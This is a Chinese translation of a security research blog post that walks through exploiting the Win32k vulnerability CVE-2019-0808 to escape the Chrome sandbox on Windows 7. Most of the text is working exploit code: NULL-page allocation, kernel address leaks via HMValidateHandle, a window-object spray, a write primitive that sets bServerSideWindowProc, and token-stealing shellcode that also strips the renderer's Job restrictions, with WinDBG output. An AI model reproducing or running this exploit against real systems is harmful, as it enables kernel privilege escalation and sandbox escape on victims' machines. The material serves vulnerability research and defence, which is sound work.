# Windows版“碟中谍”：如何利用Win32k漏洞实现Chrome沙盒逃逸（下）

阅读量 **274090**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2019-05-30 11:00:24

 **x**

##### 译文声明

本文是翻译文章，文章原作者 exodusintel，文章来源：blog.exodusintel.com

原文地址：<http://blog.exodusintel.com/2019/05/17/windows-within-windows/>

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p1.ssl.qhimg.com/t011870e09d835b4b5f.gif)

## 写在前面的话

在我们的《Windows版“碟中谍”：如何利用Win32k漏洞实现Chrome沙盒逃逸（上）》这篇文章中，我们对近期修复的一个Win32k漏洞（CVE-2019-0808）进行了分析，在给出了针对该漏洞的PoC代码之后，我们还对这份PoC代码及其核心组件进行了深入分析。那么在这篇文章中，我们将跟大家详细介绍如何利用这个Chrome沙盒漏洞，并详细介绍漏洞利用过程中的每一个步骤。

## Chrome沙盒漏洞利用解析

###  针对Chrome沙盒创建DLL针对Chrome沙盒创建DLL

在此之前，研究人员James
Forshaw在他的博文中曾提到过，Chrome沙盒是无法注入任何DLL的。由于沙盒限制，DLL必须以特定的方法创建，而且沙盒不会加载任何其他的代码库或manifest文件。

为了实现这个目标，我们选择使用Visual
Studio项目来实现PoC，并将项目类型设置为DLL，而不是EXE。接下来，在C++编译器设置中，使用多线程运行库，并设置Visual
Studio不生成manifest文件。

完成之后，Visual Studio就可以通过漏洞（CVE-2019-5786或其他DLL注入技术）来在Chrome沙盒中生成并加载DLL了。

###  理解现有的限制写入原语

首先，我们需要了解限制写入原语，它可以帮助攻击者成功设置一个NULL页面，这也是利用该漏洞的基础。漏洞触发后，win32k.sys中的xxxMNUpdateDraggingInfo()将会被调用，如果NULL页面设置正确，那么xxxMNUpdateDraggingInfo()将会调用xxxMNSetGapState()，相关代码如下：

`void __stdcall xxxMNSetGapState(ULONG_PTR uHitArea, UINT uIndex, UINT uFlags,
BOOL fSet)  
{  
...  
var_PITEM = MNGetpItem(var_POPUPMENU, uIndex); // Get the address where the
first write  
// operation should occur, minus an  
// offset of 0x4.  
temp_var_PITEM = var_PITEM;  
if ( var_PITEM )  
{  
...  
var_PITEM_Minus_Offset_Of_0x6C = MNGetpItem(var_POPUPMENU_copy, uIndex - 1);
// Get the  
// address where the second write operation  
// should occur, minus an offset of 0x4. This  
// address will be 0x6C bytes earlier in  
// memory than the address in var_PITEM.  
if ( fSet )  
{  
*((_DWORD *)temp_var_PITEM + 1) |= 0x80000000; // Conduct the first write to the  
// attacker controlled address.  
if ( var_PITEM_Minus_Offset_Of_0x6C )  
{  
*((_DWORD *)var_PITEM_Minus_Offset_Of_0x6C + 1) |= 0x40000000u;  
// Conduct the second write to the attacker  
// controlled address minus 0x68 (0x6C-0x4).  
...`

``xxxMNSetGapState()会向攻击者控制的位置（偏移量+4）执行两次写入操作，这两次的区别是数据写入的位置比之前的靠前了0x6C字节。而且，写入使用的是OR操作，这也就意味着攻击者只需要向DWORD值中添加bit即可，而且无法删除或修改之前的位数据。

根据我们的观察，攻击者如果想实现Chrome沙盒逃逸的话，他们还需要使用更加强大的写入原语。因此，这里可以使用限制写入原语和tagWND对象来实现更加强大的写入原语。

###  分配NULL页面

在PoC代码中，main()函数可以从ntdll.dll中获取NtAllocateVirtualMemory()的地址，并将其存储在变量pfnNtAllocateVirtualMemory中。完成后，代码会调用allocateNullPage()来分配NULL页面，地址为0x1，权限包含读、写和可执行。接下来，地址0x1会通过NtAllocateVirtualMemory()来自减，并靠近页面边界，此时攻击者将能够分配地址为0x0的内存。

`typedef NTSTATUS(WINAPI *NTAllocateVirtualMemory)(  
HANDLE ProcessHandle,  
PVOID *BaseAddress,  
ULONG ZeroBits,  
PULONG AllocationSize,  
ULONG AllocationType,  
ULONG Protect  
);  
NTAllocateVirtualMemory pfnNtAllocateVirtualMemory = 0;  
....  
pfnNtAllocateVirtualMemory =
(NTAllocateVirtualMemory)GetProcAddress(GetModuleHandle(L"ntdll.dll"),
"NtAllocateVirtualMemory");  
....  
// Thanks to
https://github.com/YeonExp/HEVD/blob/c19ad75ceab65cff07233a72e2e765be866fd636/NullPointerDereference/NullPointerDereference/main.cpp#L56
for  
// explaining this in an example along with the finer details that are often
forgotten.  
bool allocateNullPage() {  
/* Set the base address at which the memory will be allocated to 0x1.  
This is done since a value of 0x0 will not be accepted by
NtAllocateVirtualMemory,  
however due to page alignment requirements the 0x1 will be rounded down to 0x0
internally.*/  
PVOID BaseAddress = (PVOID)0x1;  
/* Set the size to be allocated to 40960 to ensure that there  
is plenty of memory allocated and available for use. */  
SIZE_T size = 40960;  
/* Call NtAllocateVirtualMemory to allocate the virtual memory at address 0x0
with the size  
specified in the variable size. Also make sure the memory is allocated with
read, write,  
and execute permissions.*/  
NTSTATUS result = pfnNtAllocateVirtualMemory(GetCurrentProcess(),
&BaseAddress, 0x0, &size, MEM_COMMIT | MEM_RESERVE | MEM_TOP_DOWN,
PAGE_EXECUTE_READWRITE);  
// If the call to NtAllocateVirtualMemory failed, return FALSE.  
if (result != 0x0) {  
return FALSE;  
}  
// If the code reaches this point, then everything went well, so return TRUE.  
return TRUE;  
}`

###  利用窗口对象创建任意内和地址写入原语

首先，攻击者需要获取到HMValidateHandle()的地址，而HMValidateHandle()的作用就是帮助攻击者获取用户态的拷贝对象。相关代码如下：

`HMODULE hUser32 = LoadLibraryW(L"user32.dll");  
LoadLibraryW(L"gdi32.dll");  
// Find the address of HMValidateHandle using the address of user32.dll  
if (findHMValidateHandleAddress(hUser32) == FALSE) {  
printf("[!] Couldn't locate the address of HMValidateHandle!rn");  
ExitProcess(-1);  
}  
...  
BOOL findHMValidateHandleAddress(HMODULE hUser32) {  
// The address of the function HMValidateHandleAddress() is not exported to  
// the public. However the function IsMenu() contains a call to
HMValidateHandle()  
// within it after some short setup code. The call starts with the byte xEB.  
// Obtain the address of the function IsMenu() from user32.dll.  
BYTE * pIsMenuFunction = (BYTE *)GetProcAddress(hUser32, "IsMenu");  
if (pIsMenuFunction == NULL) {  
printf("[!] Failed to find the address of IsMenu within user32.dll.rn");  
return FALSE;  
}  
else {  
printf("[*] pIsMenuFunction: 0x%08Xrn", pIsMenuFunction);  
}  
// Search for the location of the xEB byte within the IsMenu() function  
// to find the start of the indirect call to HMValidateHandle().  
unsigned int offsetInIsMenuFunction = 0;  
BOOL foundHMValidateHandleAddress = FALSE;  
for (unsigned int i = 0; i > 0x1000; i++) {  
BYTE* pCurrentByte = pIsMenuFunction + i;  
if (*pCurrentByte == 0xE8) {  
offsetInIsMenuFunction = i + 1;  
break;  
}  
}  
// Throw error and exit if the xE8 byte couldn't be located.  
if (offsetInIsMenuFunction == 0) {  
printf("[!] Couldn't find offset to HMValidateHandle within IsMenu.rn");  
return FALSE;  
}  
// Output address of user32.dll in memory for debugging purposes.  
printf("[*] hUser32: 0x%08Xrn", hUser32);  
// Get the value of the relative address being called within the IsMenu()
function.  
unsigned int relativeAddressBeingCalledInIsMenu = *(unsigned int
*)(pIsMenuFunction + offsetInIsMenuFunction);  
printf("[*] relativeAddressBeingCalledInIsMenu: 0x%08Xrn",
relativeAddressBeingCalledInIsMenu);  
// Find out how far the IsMenu() function is located from the base address of
user32.dll.  
unsigned int addressOfIsMenuFromStartOfUser32 = ((unsigned int)pIsMenuFunction
- (unsigned int)hUser32);  
printf("[*] addressOfIsMenuFromStartOfUser32: 0x%08Xrn",
addressOfIsMenuFromStartOfUser32);  
// Take this offset and add to it the relative address used in the call to
HMValidateHandle().  
// Result should be the offset of HMValidateHandle() from the start of
user32.dll.  
unsigned int offset = addressOfIsMenuFromStartOfUser32 +
relativeAddressBeingCalledInIsMenu;  
printf("[*] offset: 0x%08Xrn", offset);  
// Skip over 11 bytes since on Windows 10 these are not NOPs and it would be  
// ideal if this code could be reused in the future.  
pHmValidateHandle = (lHMValidateHandle)((unsigned int)hUser32 + offset + 11);  
printf("[*] pHmValidateHandle: 0x%08Xrn", pHmValidateHandle);  
return TRUE;  
}`

获取到HMValidateHandle()的地址之后，PoC代码将会调用sprayWindows()函数，它的作用就是使用RegisterClassExW()来注册一个名叫sprayWindowClass的窗口类，这个类可以调用攻击者定义的窗口进程sprayCallback()。此时，将会创建一个名叫hwndSprayHandleTable的HWND表，并调用CreateWindowExW()在0x100创建sprayWindowClass类的tagWND对象，然后将处理函数存储到hwndSprayHandle表中。每一个tagWND对象的内核地址都会存储在tagWND对象的pSelf域中。下面给出的是sprayWindows类的数据结构：

    
    
    / The following definitions define the various structures
    needed within sprayWindows() /
    typedef struct _HEAD
    {
    HANDLE h;
    DWORD cLockObj;
    } HEAD, PHEAD;
    typedef struct _THROBJHEAD
    {
    HEAD h;
    PVOID pti;
    } THROBJHEAD, PTHROBJHEAD;
    typedef struct _THRDESKHEAD
    {
    THROBJHEAD h;
    PVOID rpdesk;
    PVOID pSelf; // points to the kernel mode address of the object
    } THRDESKHEAD, *PTHRDESKHEAD;
    ….
    // Spray the windows and find two that are less than 0x3fd00 apart in memory.
    if (sprayWindows() == FALSE) {
    printf(“[!] Couldn’t find two tagWND objects less than 0x3fd00 apart in memory after the spray!rn”);
    ExitProcess(-1);
    }
    ….
    // Define the HMValidateHandle window type TYPE_WINDOW appropriately.
    
    define TYPE_WINDOW 1
    / Main function for spraying the tagWND objects into memory and finding two
    that are less than 0x3fd00 apart /
    bool sprayWindows() {
    HWND hwndSprayHandleTable[0x100]; // Create a table to hold 0x100 HWND handles created by the spray.
    // Create and set up the window class for the sprayed window objects.
    WNDCLASSEXW sprayClass = { 0 };
    sprayClass.cbSize = sizeof(WNDCLASSEXW);
    sprayClass.lpszClassName = TEXT(“sprayWindowClass”);
    sprayClass.lpfnWndProc = sprayCallback; // Set the window procedure for the sprayed
    // window objects to sprayCallback().
    if (RegisterClassExW(&sprayClass) == 0) {
    printf(“[!] Couldn’t register the sprayClass class!rn”);
    }
    // Create 0x100 windows using the sprayClass window class with the window name “spray”.
    for (int i = 0; i < 0x100; i++) {
    hwndSprayHandleTable[i] = CreateWindowExW(0, sprayClass.lpszClassName, TEXT(“spray”), 0, CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT, NULL, NULL, NULL, NULL);
    }
    // For each entry in the hwndSprayHandle table…
    for (int x = 0; x < 0x100; x++) {
    // Leak the kernel address of the current HWND being examined, save it into firstEntryAddress.
    THRDESKHEAD firstEntryDesktop = (THRDESKHEAD )pHmValidateHandle(hwndSprayHandleTable[x], TYPE_WINDOW);
    unsigned int firstEntryAddress = (unsigned int)firstEntryDesktop->pSelf;
    // Then start a loop to start comparing the kernel address of this hWND
    // object to the kernel address of every other hWND object…
    for (int y = 0; y < 0x100; y++) {
    if (x != y) { // Skip over one instance of the loop if the entries being compared are
    // at the same offset in the hwndSprayHandleTable
    // Leak the kernel address of the second hWND object being used in
    // the comparison, save it into secondEntryAddress.
    THRDESKHEAD secondEntryDesktop = (THRDESKHEAD )pHmValidateHandle(hwndSprayHandleTable[y], TYPE_WINDOW);
    unsigned int secondEntryAddress = (unsigned int)secondEntryDesktop->pSelf;
    // If the kernel address of the hWND object leaked earlier in the code is greater than
    // the kernel address of the hWND object leaked above, execute the following code.
    if (firstEntryAddress > secondEntryAddress) {
    // Check if the difference between the two addresses is less than 0x3fd00.
    if ((firstEntryAddress - secondEntryAddress) < 0x3fd00) {
    printf(“[] Primary window address: 0x%08Xrn”, secondEntryAddress);
    printf(“[] Secondary window address: 0x%08Xrn”, firstEntryAddress);
    // Save the handle of secondEntryAddress into hPrimaryWindow
    // and its address into primaryWindowAddress.
    hPrimaryWindow = hwndSprayHandleTable[y];
    primaryWindowAddress = secondEntryAddress;
    // Save the handle of firstEntryAddress into hSecondaryWindow
    // and its address into secondaryWindowAddress.
    hSecondaryWindow = hwndSprayHandleTable[x];
    secondaryWindowAddress = firstEntryAddress;
    // Windows have been found, escape the loop.
    break;
    }
    }
    // If the kernel address of the hWND object leaked earlier in the code is less than
    // the kernel address of the hWND object leaked above, execute the following code.
    else {
    // Check if the difference between the two addresses is less than 0x3fd00.
    if ((secondEntryAddress - firstEntryAddress) < 0x3fd00) {
    printf(“[] Primary window address: 0x%08Xrn”, firstEntryAddress);
    printf(“[] Secondary window address: 0x%08Xrn”, secondEntryAddress);
    // Save the handle of firstEntryAddress into hPrimaryWindow
    // and its address into primaryWindowAddress.
    hPrimaryWindow = hwndSprayHandleTable[x];
    primaryWindowAddress = firstEntryAddress;
    // Save the handle of secondEntryAddress into hSecondaryWindow
    // and its address into secondaryWindowAddress.
    hSecondaryWindow = hwndSprayHandleTable[y];
    secondaryWindowAddress = secondEntryAddress;
    // Windows have been found, escape the loop.
    break;
    }
    }
    }
    }
    // Check if the inner loop ended and the windows were found. If so print a debug message.
    // Otherwise continue on to the next object in the hwndSprayTable array.
    if (hPrimaryWindow != NULL) {
    printf(“[] Found target windows!rn”);
    break;
    }
    }

接下来，其他窗口会使用DestroyWindow()实现自毁，并释放主机操作系统的资源：

    
    
    // Check that hPrimaryWindow isn’t NULL after both the loops are
    // complete. This will only occur in the event that none of the 0x1000
    // window objects were within 0x3fd00 bytes of each other. If this occurs, then bail.
    if (hPrimaryWindow == NULL) {
    printf(“[!] Couldn’t find the right windows for the tagWND primitive. Exiting….rn”);
    return FALSE;
    }
    // This loop will destroy the handles to all other
    // windows besides hPrimaryWindow and hSecondaryWindow,
    // thereby ensuring that there are no lingering unused
    // handles wasting system resources.
    for (int p = 0; p > 0x100; p++) {
    HWND temp = hwndSprayHandleTable[p];
    if ((temp != hPrimaryWindow) && (temp != hSecondaryWindow)) {
    DestroyWindow(temp);
    }
    }
    addressToWrite = (UINT)primaryWindowAddress + 0x90; // Set addressToWrite to
    // primaryWindow’s cbwndExtra field.
    printf(“[] Destroyed spare windows!rn”);
    // Check if its possible to set the window text in hSecondaryWindow.
    // If this isn’t possible, there is a serious error, and the program should exit.
    // Otherwise return TRUE as everything has been set up correctly.
    if (SetWindowTextW(hSecondaryWindow, L”test String”) == 0) {
    printf(“[!] Something is wrong, couldn’t initialize the text buffer in the secondary window….rn”);
    return FALSE;
    }
    else {
    return TRUE;
    }

最后，为了让PoC代码知道限制写入原语的位置，sprayWindows()还会设置addressToWrite并将地址写入至primaryWindowAddress的cbwndExtra域中。下图显示的是hPrimaryWindow中cbwndExtra域的修改情况：

![](https://p2.ssl.qhimg.com/t011df4918c569ba387.png)

通过执行功能更强的写入原语，攻击者将能够控制内核地址的值，这是实现沙盒逃逸的关键。下面给出的是WinDBG中查看到的tagWND对象，这也是非常关键的：

    
    
    1: kd> dt -r1 win32k!tagWND
    +0x000 head : _THRDESKHEAD
    +0x000 h : Ptr32 Void
    +0x004 cLockObj : Uint4B
    +0x008 pti : Ptr32 tagTHREADINFO
    +0x00c rpdesk : Ptr32 tagDESKTOP
    +0x010 pSelf : Ptr32 UChar
    …
    +0x084 strName : _LARGE_UNICODE_STRING
    +0x000 Length : Uint4B
    +0x004 MaximumLength : Pos 0, 31 Bits
    +0x004 bAnsi : Pos 31, 1 Bit
    +0x008 Buffer : Ptr32 Uint2B
    +0x090 cbwndExtra : Int4B
    … 

###  在内存中设置NULL页面

为了正确设置NULL页面，必须填充下列偏移量：

`0x20  
0x34  
0x4C  
0x50 to 0x1050`

具体内容如下图所示：

![](https://p5.ssl.qhimg.com/t0162f47aab3fd8cd35.jpg)

漏洞利用代码会将NULL页面中偏移量0x20填充0xFFFFFFFF，此时的spMenu会被设置为NULL，所以spMenu->cItems将包含NULL页面偏移量0x20的值。相关代码如下:

`tagITEM *__stdcall MNGetpItemFromIndex(tagMENU *spMenu, UINT pPopupMenu)  
{  
tagITEM *result; // eax  
if ( pPopupMenu == -1 || pPopupMenu >= spMenu->cItems ) // NULL pointer
dereference will occur  
// here if spMenu is NULL.  
result = 0;  
else  
result = (tagITEM *)spMenu->rgItems + 0x6C * pPopupMenu;  
return result;  
}`

NULL页面偏移量0x34所包含的DWORD值为spMenu->rgItemsd的值，而xxxMNUpdateDraggingInfo()将会利用这些偏移量来进行进一步操作：

`.text:BF975EA3 mov eax, [ebx+14h] ; EAX = ppopupmenu->spmenu  
.text:BF975EA3 ;  
.text:BF975EA3 ; Should set EAX to 0 or NULL.  
.text:BF975EA6 push dword ptr [eax+4Ch] ; uIndex aka pPopupMenu. This will be
the  
.text:BF975EA6 ; value at address 0x4C given that  
.text:BF975EA6 ; ppopupmenu->spmenu is NULL.  
.text:BF975EA9 push eax ; spMenu. Will be NULL or 0.  
.text:BF975EAA call MNGetpItemFromIndex  
..............  
.text:BF975EBA add ecx, [eax+28h] ; ECX += pItemFromIndex->yItem  
.text:BF975EBA ;  
.text:BF975EBA ; pItemFromIndex->yItem will be the value  
.text:BF975EBA ; at offset 0x28 of whatever value  
.text:BF975EBA ; MNGetpItemFromIndex returns.  
...............  
.text:BF975ECE cmp ecx, ebx  
.text:BF975ED0 jg short loc_BF975EDB ; Jump to loc_BF975EDB if the following  
.text:BF975ED0 ; condition is true:  
.text:BF975ED0 ;  
.text:BF975ED0 ; ((pMenuState->ptMouseLast.y -pMenuState->uDraggingHitArea->rcClient.top) + pItemFromIndex->yItem) >
(pItem->yItem + SYSMET(CYDRAG))`

###  利用限制写入原语创建更加强大的写入原语

NULL页面设置完成之后，SubMenuProc()将会把hWndFakeMenu返回给xxxMNFindWindowFromPoint()中的xxxSendMessage()，并继续执行：

`memset((void *)0x50, 0xF0, 0x1000);  
return (ULONG)hWndFakeMenu;`

在调用xxxSendMessage()之后，xxxMNFindWindowFromPoint()将会调用HMValidateHandleNoSecure()来确保hWndFakeMenu成为了窗口对象的处理器。相关代码如下所示：

`v6 = xxxSendMessage(  
var_pPopupMenu->spwndNextPopup,  
MN_FINDMENUWINDOWFROMPOINT,  
(WPARAM)&pPopupMenu,  
(unsigned __int16)screenPt.x | (*(unsigned int *)&screenPt >> 16 << 16)); //
Make the  
// MN_FINDMENUWINDOWFROMPOINT usermode callback  
// using the address of pPopupMenu as the  
// wParam argument.  
ThreadUnlock1();  
if ( IsMFMWFPWindow(v6) ) // Validate the handle returned from the user  
// mode callback is a handle to a MFMWFP window.  
v6 = (LONG_PTR)HMValidateHandleNoSecure((HANDLE)v6, TYPE_WINDOW); // Validate
that the returned handle  
// is a handle to a window object.  
// Set v1 to TRUE if all is good.`

如果hWndFakeMenu是一个窗口对象的有效处理器，那么xxxMNSetGapState()将会被执行，然后将primaryWindow中的cbwndExtra域设置为0x40000000。

`void __stdcall xxxMNSetGapState(ULONG_PTR uHitArea, UINT uIndex, UINT uFlags,
BOOL fSet)  
{  
...  
var_PITEM = MNGetpItem(var_POPUPMENU, uIndex); // Get the address where the
first write  
// operation should occur, minus an  
// offset of 0x4.  
temp_var_PITEM = var_PITEM;  
if ( var_PITEM )  
{  
...  
var_PITEM_Minus_Offset_Of_0x6C = MNGetpItem(var_POPUPMENU_copy, uIndex - 1);
// Get the  
// address where the second write operation  
// should occur, minus an offset of 0x4. This  
// address will be 0x6C bytes earlier in  
// memory than the address in var_PITEM.  
if ( fSet )  
{  
*((_DWORD *)temp_var_PITEM + 1) |= 0x80000000; // Conduct the first write to the  
// attacker controlled address.  
if ( var_PITEM_Minus_Offset_Of_0x6C )  
{  
*((_DWORD *)var_PITEM_Minus_Offset_Of_0x6C + 1) |= 0x40000000u;  
// Conduct the second write to the attacker  
// controlled address minus 0x68 (0x6C-0x4).`

xxxMNSetGapState()中的内核写入操作完成之后，代码将会发送窗口消息0x1E5，更新后的漏洞利用代码如下：

`else {  
if ((cwp->message == 0x1E5)) {  
UINT offset = 0; // Create the offset variable which will hold the offset from
the  
// start of hPrimaryWindow's cbwnd data field to write to.  
UINT addressOfStartofPrimaryWndCbWndData = (primaryWindowAddress + 0xB0); //
Set  
// addressOfStartofPrimaryWndCbWndData to the address of  
// the start of hPrimaryWindow's cbwnd data field.  
// Set offset to the difference between hSecondaryWindow's  
// strName.Buffer's memory address and the address of  
// hPrimaryWindow's cbwnd data field.  
offset = ((secondaryWindowAddress + 0x8C) -addressOfStartofPrimaryWndCbWndData);  
printf("[*] Offset: 0x%08Xrn", offset);  
// Set the strName.Buffer address in hSecondaryWindow to
(secondaryWindowAddress + 0x16),  
// or the address of the bServerSideWindowProc bit.  
if (SetWindowLongA(hPrimaryWindow, offset, (secondaryWindowAddress + 0x16)) ==
0) {  
printf("[!] SetWindowLongA malicious error: 0x%08Xrn", GetLastError());  
ExitProcess(-1);  
}  
else {  
printf("[*] SetWindowLongA called to set strName.Buffer address. Current
strName.Buffer address that is being adjusted: 0x%08Xrn",
(addressOfStartofPrimaryWndCbWndData + offset));  
}`

此代码的开始部分，将检查窗口消息是否为0x15。如果是，代码将计算primaryWindow的wndExtra数据部分的开始与secondaryWindow的strName.Buffer指针的位置之间的距离。这两个位置之间的差异将保存到变量offset中。

完成此操作后，使用hPrimaryWindow调用SetWindowLongA()，并使用offset变量将secondaryWindow的strName.Buffer指针设置为secondaryWindow的bServerSideWindowProc字段的地址。该操作的效果如下图所示。

![](https://p0.ssl.qhimg.com/t018fc74754241b8af1.jpg)

通过执行此操作，当在secondaryWindow上调用SetWindowText()时，它将继续使用其覆盖的strName.Buffer指针来确定应该执行写入的位置，如果这里有适当的值，那么将导致secondaryWindow的bServerSideWindowProc标记被覆盖作为SetWindowText()的IpString参数提供。

利用tagWND写入原语以设置bServerSideWindowProc位

将secondaryWindow中的strName.Buffer字段设置为secondaryWindow的bServerSideWindowProc标志的地址后，使用hWnd参数hSecondaryWindow和lpString值“x06”调用SetWindowText()，以便在secondaryWindow中启用bServerSideWindowProc标志。

`// Write the value x06 to the address pointed to by hSecondaryWindow's
strName.Buffer  
// field to set the bServerSideWindowProc bit in hSecondaryWindow.  
if (SetWindowTextA(hSecondaryWindow, "x06") == 0) {  
printf("[!] SetWindowTextA couldn't set the bServerSideWindowProc bit. Error
was: 0x%08Xrn", GetLastError());  
ExitProcess(-1);  
}  
else {  
printf("Successfully set the bServerSideWindowProc bit at: 0x%08Xrn",
(secondaryWindowAddress + 0x16));`

下图展示了在调用SetWindowTextA()之前和之后，secondaryWindow的tagWND布局。

![](https://p2.ssl.qhimg.com/t01ceb555f9a8e891e3.jpg)

设置bServerSideWindowProc标志可确保secondaryWindow的窗口过程sprayCallback()现在将以具有SYSTEM级别权限的内核模式运行，而不是像大多数其他窗口过程一样在用户模式下运行。这是一种流行的特权提升方法，并且已经在许多攻击中运用，例如Sednit
APT组织在2017年发动的攻击。下图更加详细地说明了这一点。

![](https://p1.ssl.qhimg.com/t0134d4a226058513f0.jpg)

窃取进程令牌并移除作业限制

在完成对SetWindowTextA()的调用后，将向hSecondaryWindow发送WM_ENTERIDLE消息，如下述代码所示。

`printf("Sending hSecondaryWindow a WM_ENTERIDLE message to trigger the
execution of the shellcode as SYSTEM.rn");  
SendMessageA(hSecondaryWindow, WM_ENTERIDLE, NULL, NULL);  
if (success == TRUE) {  
printf("[*] Successfully exploited the program and triggered the
shellcode!rn");  
}  
else {  
printf("[!] Didn't exploit the program. For some reason our privileges were
not appropriate.rn");  
ExitProcess(-1);  
}`

随后，secondaryWindow的窗口过程sprayCallback()将获取WM_ENTERIDLE消息。该功能的代码如下所示。

`// Tons of thanks go to
https://github.com/jvazquez-r7/MS15-061/blob/first_fix/ms15-061.cpp for  
// additional insight into how this function should operate. Note that a token
stealing shellcode  
// is called here only because trying to spawn processes or do anything
complex as SYSTEM  
// often resulted in APC_INDEX_MISMATCH errors and a kernel crash.  
LRESULT CALLBACK sprayCallback(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM
lParam)  
{  
if (uMsg == WM_ENTERIDLE) {  
WORD um = 0;  
__asm  
{  
// Grab the value of the CS register and  
// save it into the variable UM.  
mov ax, cs  
mov um, ax  
}  
// If UM is 0x1B, this function is executing in usermode  
// code and something went wrong. Therefore output a message that  
// the exploit didn't succeed and bail.  
if (um == 0x1b)  
{  
// USER MODE  
printf("[!] Exploit didn't succeed, entered sprayCallback with user mode
privileges.rn");  
ExitProcess(-1); // Bail as if this code is hit either the target isn't  
// vulnerable or something is wrong with the exploit.  
}  
else  
{  
success = TRUE; // Set the success flag to indicate the sprayCallback()  
// window procedure is running as SYSTEM.  
Shellcode(); // Call the Shellcode() function to perform the token stealing
and  
// to remove the Job object on the Chrome renderer process.  
}  
}  
return DefWindowProc(hWnd, uMsg, wParam, lParam);  
}`

由于已经在secondaryWindow的tagWND对象中设置了bServerSideWindowProc标志，因此现在应该以SYSTEM用户身份运行sprayCallback()。sprayCallback()函数首先检查传入消息是否为WM_ENTERIDLE消息。如果是，那么内联Shellcode将确保sparyCallback()确实作为SYSTEM用户运行。如果该检查通过，那么布尔型变量将成功设置为TRUE，以指示攻击成功，随后执行函数Shellcode()。

Shellcode()将使用abatchy博客文章中展示的Shellcode执行一个简单的令牌窃取攻击，在下面的代码中重点展示，并做了两处微小的修改。

    
    
    // Taken from https://www.abatchy.com/2018/01/kernel-exploitation-2#token-stealing-payload-windows-7-x86-sp1.
    // Essentially a standard token stealing shellcode, with two lines
    // added to remove the Job object associated with the Chrome
    // renderer process.
    declspec(noinline) int Shellcode()
    {
    asm {
    xor eax, eax // Set EAX to 0.
    mov eax, DWORD PTR fs : [eax + 0x124] // Get nt!_KPCR.PcrbData.
    // _KTHREAD is located at FS:[0x124]
    
              mov eax, [eax + 0x50] // Get nt!_KTHREAD.ApcState.Process
              mov ecx, eax // Copy current process _EPROCESS structure
              xor edx, edx // Set EDX to 0.
              mov DWORD PTR [ecx + 0x124], edx // Set the JOB pointer in the _EPROCESS structure to NULL.
              mov edx, 0x4 // Windows 7 SP1 SYSTEM process PID = 0x4
    
              SearchSystemPID:
                     mov eax, [eax + 0B8h] // Get nt!_EPROCESS.ActiveProcessLinks.Flink
                     sub eax, 0B8h
                     cmp [eax + 0B4h], edx // Get nt!_EPROCESS.UniqueProcessId
                     jne SearchSystemPID
    
              mov edx, [eax + 0xF8] // Get SYSTEM process nt!_EPROCESS.Token
              mov [ecx + 0xF8], edx // Assign SYSTEM process token.
       }
    }

这里的修改采用了Chrome渲染器进程的EPROCESS结构，并且其作业指针为NULL。这样做的目的，是因为在尝试过程中发现，即使Shellcode窃取了SYSTEM令牌，该令牌仍然会继承Chrome渲染器进程的作业对象，从而阻止漏洞利用生成任何子进程。在更改Chrome渲染器进程的令牌之前，将Chrome渲染器进程中的作业指针清空，将会从Chrome渲染器进程和稍后分配给它的任何令牌中删除作业限制，从而防止这种情况发生。

为了更好地理解对作业对象进行NULL操作的重要性，我们需要检查以下令牌转储，以获取正常的Chrome渲染器进程。需要注意的是，作业对象字段已经填写，因此作业对象限制当前正在应用于该进程。

    
    
    0: kd> !process C54
    Searching for Process with Cid == c54
    PROCESS 859b8b40 SessionId: 2 Cid: 0c54 Peb: 7ffd9000 ParentCid: 0f30
    DirBase: bf2f2cc0 ObjectTable: 8258f0d8 HandleCount: 213.
    Image: chrome.exe
    VadRoot 859b9e50 Vads 182 Clone 0 Private 2519. Modified 718. Locked 0.
    DeviceMap 9abe5608
    Token a6fccc58
    ElapsedTime 00:00:18.588
    UserTime 00:00:00.000
    KernelTime 00:00:00.000
    QuotaPoolUsage[PagedPool] 351516
    QuotaPoolUsage[NonPagedPool] 11080
    Working Set Sizes (now,min,max) (9035, 50, 345) (36140KB, 200KB, 1380KB)
    PeakWorkingSetSize 9730
    VirtualSize 734 Mb
    PeakVirtualSize 740 Mb
    PageFaultCount 12759
    MemoryPriority BACKGROUND
    BasePriority 8
    CommitCharge 5378
    Job 859b3ec8
    
        THREAD 859801e8  Cid 0c54.08e8  Teb: 7ffdf000 Win32Thread: fe118dc8 WAIT: (UserRequest) UserMode Non-Alertable
            859c6dc8  SynchronizationEvent

为了确认这些限制确实存在，我们可以在Process Explorer中检查该进程的进程令牌。通过该进程，能够确认作业确实存在许多限制，比如禁止生成子进程。

![](https://p4.ssl.qhimg.com/t01df39b8d3e6885d68.png)

如果该进程令牌中的“作业”字段设置为NULL，则WinDBG的!process命令不会再将作业与对象关联。

    
    
    1: kd> dt nt!_EPROCESS 859b8b40 Job
    +0x124 Job : 0x859b3ec8 _EJOB
    1: kd> dd 859b8b40+0x124
    859b8c64 859b3ec8 99c4d988 00fd0000 c512eacc
    859b8c74 00000000 00000000 00000070 00000f30
    859b8c84 00000000 00000000 00000000 9abe5608
    859b8c94 00000000 7ffaf000 00000000 00000000
    859b8ca4 00000000 a4e89000 6f726863 652e656d
    859b8cb4 00006578 01000000 859b3ee0 859b3ee0
    859b8cc4 00000000 85980450 85947298 00000000
    859b8cd4 862f2cc0 0000000e 265e67f7 00008000
    1: kd> ed 859b8c64 0
    1: kd> dd 859b8b40+0x124
    859b8c64 00000000 99c4d988 00fd0000 c512eacc
    859b8c74 00000000 00000000 00000070 00000f30
    859b8c84 00000000 00000000 00000000 9abe5608
    859b8c94 00000000 7ffaf000 00000000 00000000
    859b8ca4 00000000 a4e89000 6f726863 652e656d
    859b8cb4 00006578 01000000 859b3ee0 859b3ee0
    859b8cc4 00000000 85980450 85947298 00000000
    859b8cd4 862f2cc0 0000000e 265e67f7 00008000
    1: kd> dt nt!_EPROCESS 859b8b40 Job
    +0x124 Job : (null)
    1: kd> !process C54
    Searching for Process with Cid == c54
    PROCESS 859b8b40 SessionId: 2 Cid: 0c54 Peb: 7ffd9000 ParentCid: 0f30
    DirBase: bf2f2cc0 ObjectTable: 8258f0d8 HandleCount: 214.
    Image: chrome.exe
    VadRoot 859b9e50 Vads 180 Clone 0 Private 2531. Modified 720. Locked 0.
    DeviceMap 9abe5608
    Token a6fccc58
    ElapsedTime 00:14:15.066
    UserTime 00:00:00.015
    KernelTime 00:00:00.000
    QuotaPoolUsage[PagedPool] 351132
